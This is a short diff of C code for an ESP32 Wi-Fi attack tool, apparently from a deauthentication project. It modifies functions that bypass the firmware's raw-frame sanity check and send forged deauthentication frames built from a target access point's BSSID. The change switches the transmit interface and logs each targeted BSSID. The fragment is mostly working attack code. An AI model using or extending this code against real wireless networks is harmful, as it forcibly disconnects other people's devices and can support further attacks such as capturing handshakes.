@@ -45,11 +45,14 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
 }
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
 }
 
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Sending deauth frame...");
+    ESP_LOGI(TAG, "Deauthing BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
+    ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+    ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
     uint8_t deauth_frame[sizeof(deauth_frame_default)];
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
